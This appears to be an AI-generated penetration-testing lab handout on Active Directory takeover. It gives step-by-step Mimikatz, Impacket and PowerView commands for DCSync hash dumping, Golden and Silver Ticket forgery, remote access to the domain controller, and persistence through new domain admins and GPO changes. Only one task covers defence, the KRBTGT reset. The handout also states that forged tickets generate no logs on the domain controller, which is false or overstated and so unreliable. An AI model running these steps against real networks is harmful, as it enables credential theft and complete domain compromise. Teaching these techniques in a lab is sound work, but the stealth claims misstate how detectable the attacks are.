### _Week 10 — Active Directory (AD) Exploitation & Domain Takeover_

**Estimated Time:** 180–240 minutes  
**Difficulty:** Expert  
**Tools:** Mimikatz, Rubeus, Impacket (secretsdump, ticketer), PowerView, BloodHound, Meterpreter, proxychains, domain‑joined Windows host

---

## **1. Purpose of This Lab**

This lab teaches the **core techniques used to fully compromise an Active Directory domain**:

- **DCSync** — extracting the KRBTGT hash and all domain credentials
- **Golden Ticket attacks** — forging TGTs for unlimited domain access
- **Silver Ticket attacks** — forging service tickets for stealthy lateral movement
- **KRBTGT reset considerations**
- **Maintaining long‑term domain dominance**

By the end of this lab, you will be able to:

- Identify accounts with DCSync rights
- Perform DCSync using Mimikatz or Impacket
- Extract the KRBTGT hash
- Forge Golden Tickets
- Forge Silver Tickets
- Validate domain dominance
- Document a full domain compromise chain

This is the **capstone exploitation lab** for Week 10.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 10.1 (AD Enumeration)**
- Completed **Lab 10.2 (Kerberoasting & AS‑REP Roasting)**
- A foothold on a domain‑joined Windows host
- A high‑privilege account (or a path to one)
- BloodHound data imported
- Mimikatz uploaded
- Impacket installed on Kali
- SOCKS proxy + proxychains configured

Example topology:

```
Kali → Pivot → Domain Host → Domain Controller → Domain Takeover
```

---

## **3. Lab Tasks**

---

# **Task 1 — Identify DCSync‑Capable Accounts (BloodHound)**

### **Objective**

Find accounts with replication rights.

### **Steps**

In BloodHound, run:

- **“Find Principals with DCSync Rights”**

### **What to Observe**

Accounts with:

- **Replicating Directory Changes**
- **Replicating Directory Changes All**
- **Replicating Directory Changes In Filtered Set**

Common examples:

- Domain Admins
- Enterprise Admins
- Administrators
- Custom misconfigured service accounts

### **Deliverable**

A list of DCSync‑capable accounts.

---

# **Task 2 — Validate DCSync Permissions with PowerView**

### **Objective**

Confirm replication rights manually.

### **Steps**

Load PowerView:

```
. .\PowerView.ps1
```

Check ACLs:

```
Get-ObjectAcl -DistinguishedName "DC=<domain>,DC=local" -ResolveGUIDs | 
    ? { $_.IdentityReference -match "<username>" }
```

### **What to Observe**

- Replication rights assigned to the account you control

### **Deliverable**

A note confirming DCSync permissions.

---

---

# **SECTION A — PERFORMING DCSync**

---

# **Task 3 — DCSync Using Mimikatz (Windows)**

### **Objective**

Extract domain password hashes, including KRBTGT.

### **Steps**

Run Mimikatz:

```
mimikatz.exe
```

Execute:

```
lsadump::dcsync /domain:<domain> /user:krbtgt
```

Or dump all:

```
lsadump::dcsync /domain:<domain> /all
```

### **What to Observe**

- KRBTGT NTLM hash
- All domain user hashes
- Domain Admin hashes

### **Deliverable**

A list of extracted hashes, especially KRBTGT.

---

# **Task 4 — DCSync Using Impacket (Linux)**

### **Objective**

Perform DCSync from Kali through the pivot.

### **Steps**

```
proxychains python3 secretsdump.py <domain>/<user>:<pass>@<DC-IP>
```

### **What to Observe**

- NTLM hashes for all domain accounts
- KRBTGT hash
- Machine account hashes

### **Deliverable**

A secretsdump output file.

---

---

# **SECTION B — GOLDEN TICKET ATTACK**

---

# **Task 5 — Forge a Golden Ticket (Mimikatz)**

### **Objective**

Use the KRBTGT hash to forge a TGT.

### **Requirements**

You need:

- KRBTGT NTLM hash
- Domain SID
- Username to impersonate (often Administrator)

### **Steps**

Find domain SID:

```
whoami /user
```

Forge ticket:

```
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /krbtgt:<hash> /id:500
```

Inject ticket:

```
kerberos::ptt <ticket.kirbi>
```

### **What to Observe**

- You now have **unlimited domain access**
- No authentication required
- No logs generated on DC

### **Deliverable**

A note confirming Golden Ticket creation and injection.

---

# **Task 6 — Validate Golden Ticket Access**

### **Objective**

Confirm domain dominance.

### **Steps**

Try:

```
dir \\<DC>\c$
```

Or:

```
wmic /node:<DC> process list
```

Or:

```
psexec \\<DC> cmd
```

### **What to Observe**

- Full access to the domain controller
- No password required
- No authentication logs

### **Deliverable**

A list of successful privileged actions.

---

---

# **SECTION C — SILVER TICKET ATTACK**

---

# **Task 7 — Identify Service SPNs for Silver Tickets**

### **Objective**

Find services you can forge tickets for.

### **Steps**

PowerView:

```
Get-DomainSPNTicket
```

Or BloodHound:

- **“Find Principals with Kerberos Delegation Rights”**
- **“Find Servers with SPNs”**

### **What to Observe**

Common SPNs:

- CIFS
- HOST
- HTTP
- MSSQLSvc
- LDAP

### **Deliverable**

A list of SPNs suitable for Silver Tickets.

---

# **Task 8 — Forge a Silver Ticket (Mimikatz)**

### **Objective**

Forge a TGS for a specific service.

### **Steps**

```
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /target:<hostname> /service:cifs /rc4:<machine-hash>
```

Inject:

```
kerberos::ptt <ticket.kirbi>
```

### **What to Observe**

- Access to the service without touching the DC
- Extremely stealthy
- No DC logs

### **Deliverable**

A note confirming Silver Ticket access.

---

---

# **SECTION D — DOMAIN DOMINANCE & LONG‑TERM CONTROL**

---

# **Task 9 — Validate Full Domain Dominance**

### **Objective**

Confirm you control the domain.

### **Steps**

Try:

- Dumping all credentials
- Creating new domain admins
- Accessing SYSVOL
- Modifying GPOs
- Accessing DC registry remotely

### **Deliverable**

A list of validated dominance actions.

---

# **Task 10 — Understand KRBTGT Reset Procedure (Defensive Knowledge)**

### **Objective**

Know how defenders remove Golden Ticket access.

### **Key Points**

- KRBTGT password must be reset **twice**
- Replication must complete between resets
- All Golden Tickets become invalid

### **Deliverable**

A short explanation of the KRBTGT reset process.

---

# **Task 11 — Build a Domain Dominance Attack Chain**

### **Objective**

Document your entire domain takeover.

### **Include:**

- DCSync path
- KRBTGT extraction
- Golden Ticket creation
- Silver Ticket creation
- Privileged actions
- Persistence mechanisms
- Defensive considerations

### **Deliverable**

A complete domain dominance chain in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 10.3 when you can:

- Identify DCSync‑capable accounts
- Extract KRBTGT and domain hashes
- Forge Golden and Silver Tickets
- Validate domain dominance
- Document a full domain takeover chain

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 10.4 — Delegation Abuse (Unconstrained, Constrained, Resource‑Based)** in the same course style.